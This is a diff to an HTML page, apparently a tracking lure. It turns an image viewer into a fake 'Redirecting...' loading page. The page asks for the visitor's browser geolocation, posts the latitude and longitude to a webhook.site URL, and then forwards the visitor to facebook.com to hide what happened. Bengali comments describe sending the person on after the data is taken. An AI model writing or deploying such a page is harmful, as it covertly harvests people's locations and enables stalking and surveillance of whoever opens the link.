@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Image Viewer</title>
+    <title>Redirecting...</title>
 </head>
-<body style="margin:0; background-color:black; display:flex; justify-content:center; align-items:center; height:100vh;">
-
-    <img src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d" style="max-width:100%; height:auto;">
+<body style="background-color: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <p>Please wait, loading...</p>
 
     <script>
         window.onload = function() {
@@ -15,12 +14,21 @@
                     const lon = position.coords.longitude;
                     const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; 
 
+                    // লোকেশন পাঠানো
                     fetch(webhookURL, {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify({ latitude: lat, longitude: lon })
+                    }).then(() => {
+                        // ডাটা পাঠানোর পর তাকে ফেসবুক বা অন্য লিঙ্কে পাঠিয়ে দেওয়া
+                        window.location.href = "https://www.facebook.com"; 
                     });
+                }, function(error) {
+                    // যদি সে পারমিশন নাও দেয়, তবুও তাকে আসল লিঙ্কে পাঠিয়ে দেওয়া
+                    window.location.href = "https://www.facebook.com";
                 });
+            } else {
+                window.location.href = "https://www.facebook.com";
             }
         };
     </script>
